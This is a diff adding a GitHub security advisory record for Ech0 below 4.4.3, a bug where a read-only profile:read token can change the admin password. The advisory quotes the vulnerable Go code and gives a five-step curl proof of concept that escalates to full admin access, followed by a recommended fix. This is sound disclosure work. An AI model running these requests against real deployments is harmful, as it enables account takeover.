@@ -1,0 +1,85 @@
+{
+ "credits": [
+  {
+   "type": "reporter",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/114768995?v=4",
+    "events_url": "https://api.github.com/users/offset/events{/privacy}",
+    "followers_url": "https://api.github.com/users/offset/followers",
+    "following_url": "https://api.github.com/users/offset/following{/other_user}",
+    "gists_url": "https://api.github.com/users/offset/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/offset",
+    "id": 114768995,
+    "login": "offset",
+    "node_id": "U_kgDOBtc8Yw",
+    "organizations_url": "https://api.github.com/users/offset/orgs",
+    "received_events_url": "https://api.github.com/users/offset/received_events",
+    "repos_url": "https://api.github.com/users/offset/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/offset/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/offset/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/offset",
+    "user_view_type": "public"
+   }
+  }
+ ],
+ "cve_id": null,
+ "cvss": {
+  "score": 6.5,
+  "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"
+ },
+ "cvss_severities": {
+  "cvss_v3": {
+   "score": 6.5,
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"
+  },
+  "cvss_v4": {
+   "score": 0.0,
+   "vector_string": null
+  }
+ },
+ "cwes": [
+  {
+   "cwe_id": "CWE-863",
+   "name": "Incorrect Authorization"
+  }
+ ],
+ "description": "## Summary\n\nThe `PUT /user` endpoint is protected by `RequireScopes(\"profile:read\")`, which is a read-only scope. However, the endpoint performs write operations including password changes. An attacker who obtains an admin's restricted `profile:read` access token can change the admin's password, then login to receive an unrestricted session token that bypasses all scope enforcement.\n\n## Details\n\nThe scope enforcement system defines granular scopes (e.g., `echo:read`, `echo:write`, `admin:user`) but has no `profile:write` scope. The `PUT /user` route is protected only by `profile:read`:\n\n```go\n// internal/router/user.go:40-44\nappRouterGroup.AuthRouterGroup.PUT(\n    \"/user\",\n    middleware.RequireScopes(authModel.ScopeProfileRead),\n    h.UserHandler.UpdateUser(),\n)\n```\n\nThe `RequireScopes` middleware bypasses all scope checks for session tokens, and for access tokens only verifies the token contains the listed scopes:\n\n```go\n// internal/middleware/scope.go:14-19\nfunc RequireScopes(scopes ...string) gin.HandlerFunc {\n    return func(ctx *gin.Context) {\n        v := viewer.MustFromContext(ctx.Request.Context())\n        if v.TokenType() == authModel.TokenTypeSession {\n            ctx.Next()\n            return\n        }\n        // ... checks access token has required scopes (line 53)\n```\n\nThe `UpdateUser` service checks `user.IsAdmin` but does not verify the token's scope is sufficient for write operations:\n\n```go\n// internal/service/user/user.go:271-300\nfunc (userService *UserService) UpdateUser(ctx context.Context, userdto model.UserInfoDto) error {\n    userid := viewer.MustFromContext(ctx).UserID()\n    user, err := userService.userRepository.GetUserByID(ctx, userid)\n    // ...\n    if !user.IsAdmin {\n        return errors.New(commonModel.NO_PERMISSION_DENIED)\n    }\n    // ...\n    if userdto.Password != \"\" && cryptoUtil.MD5Encrypt(userdto.Password) != user.Password {\n        user.Password = cryptoUtil.MD5Encrypt(userdto.Password)  // line 299\n    }\n```\n\nAfter the password is changed, the attacker logs in via `POST /login` which calls `issueUserToken` → `CreateClaims`, producing a session token with `Type: \"session\"` (jwt.go:33). Session tokens bypass `RequireScopes` entirely, granting unrestricted API access.\n\n**Escalation chain:** `profile:read` access token → password change → login → unrestricted session token (bypasses all scope checks) → full admin access including `admin:settings`, `admin:user`, `admin:token`, `file:write`, etc.\n\n## PoC\n\n```bash\n# Prerequisites: Admin has created a profile:read access token for a read-only integration\n# The attacker has obtained this token (e.g., from compromised integration, log leak, etc.)\n\nACCESS_TOKEN=\"<admin_profile_read_access_token>\"\nSERVER=\"http://localhost:8080\"\n\n# Step 1: Verify the token only has profile:read scope (can read profile)\ncurl -s -X GET \"$SERVER/api/user\" \\\n  -H \"Authorization: Bearer $ACCESS_TOKEN\"\n# Expected: 200 OK with user profile data\n\n# Step 2: Verify the token CANNOT access admin endpoints (scope enforcement works)\ncurl -s -X GET \"$SERVER/api/allusers\" \\\n  -H \"Authorization: Bearer $ACCESS_TOKEN\"\n# Expected: 403 Forbidden (requires admin:user scope)\n\n# Step 3: Change the admin's password using the profile:read token\ncurl -s -X PUT \"$SERVER/api/user\" \\\n  -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"password\":\"attackerpass123\"}'\n# Expected: 200 OK — password changed despite only having profile:read scope\n\n# Step 4: Login with the new password to get an unrestricted session token\ncurl -s -X POST \"$SERVER/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"attackerpass123\"}'\n# Expected: 200 OK with session JWT token\n\n# Step 5: Use the session token to access admin-only endpoints\nSESSION_TOKEN=\"<session_token_from_step_4>\"\ncurl -s -X GET \"$SERVER/api/allusers\" \\\n  -H \"Authorization: Bearer $SESSION_TOKEN\"\n# Expected: 200 OK — full admin access, all scope restrictions bypassed\n```\n\n## Impact\n\nAn attacker who obtains an admin's `profile:read` access token — intended to be the most restrictive scope available — can:\n\n1. **Change the admin's password** without any write-level scope, violating the principle of least privilege\n2. **Escalate to a full unrestricted session token** by logging in with the new credentials\n3. **Gain complete admin access** including user management (`admin:user`), system settings (`admin:settings`), token management (`admin:token`), file operations (`file:write`), and all content operations\n4. **Lock the original admin out** of password-based authentication (though OAuth/passkey login remains available)\n\nThis defeats the entire purpose of the scope system: tokens intended for read-only integrations can be leveraged for full account takeover.\n\n## Recommended Fix\n\nAdd a `profile:write` scope and require it for the `PUT /user` endpoint:\n\n```go\n// internal/model/auth/scope.go — add new scope\nconst (\n    // ... existing scopes ...\n    ScopeProfileRead    = \"profile:read\"\n    ScopeProfileWrite   = \"profile:write\"  // NEW\n)\n\nvar validScopes = map[string]struct{}{\n    // ... existing entries ...\n    ScopeProfileWrite:  {},  // NEW\n}\n```\n\n```go\n// internal/router/user.go:40-44 — require profile:write for PUT\nappRouterGroup.AuthRouterGroup.PUT(\n    \"/user\",\n    middleware.RequireScopes(authModel.ScopeProfileWrite),  // Changed from ScopeProfileRead\n    h.UserHandler.UpdateUser(),\n)\n```\n\nSimilarly, update other write operations currently gated behind `profile:read`:\n- `POST /oauth/:provider/bind` → require `profile:write`\n- `POST /passkey/register/begin` and `/finish` → require `profile:write`\n- `DELETE /passkeys/:id` → require `profile:write`\n- `PUT /passkeys/:id` → require `profile:write`",
+ "ghsa_id": "GHSA-hm2h-wwwh-g49x",
+ "github_reviewed_at": "2026-04-10T19:49:13Z",
+ "html_url": "https://github.com/advisories/GHSA-hm2h-wwwh-g49x",
+ "identifiers": [
+  {
+   "type": "GHSA",
+   "value": "GHSA-hm2h-wwwh-g49x"
+  }
+ ],
+ "nvd_published_at": null,
+ "published_at": "2026-04-10T19:49:13Z",
+ "references": [
+  "https://github.com/lin-snow/Ech0/security/advisories/GHSA-hm2h-wwwh-g49x",
+  "https://github.com/lin-snow/Ech0/releases/tag/v4.4.3",
+  "https://github.com/advisories/GHSA-hm2h-wwwh-g49x"
+ ],
+ "repository_advisory_url": "https://api.github.com/repos/lin-snow/Ech0/security-advisories/GHSA-hm2h-wwwh-g49x",
+ "severity": "medium",
+ "source_code_location": "https://github.com/lin-snow/Ech0",
+ "summary": "Ech0 Scope Bypass: profile:read Access Token Can Change Admin Password and Escalate to Unrestricted Session",
+ "type": "reviewed",
+ "updated_at": "2026-04-10T19:49:15Z",
+ "url": "https://api.github.com/advisories/GHSA-hm2h-wwwh-g49x",
+ "vulnerabilities": [
+  {
+   "first_patched_version": "4.4.3",
+   "package": {
+    "ecosystem": "go",
+    "name": "github.com/lin-snow/ech0"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": "< 4.4.3"
+  }
+ ],
+ "withdrawn_at": null
+}
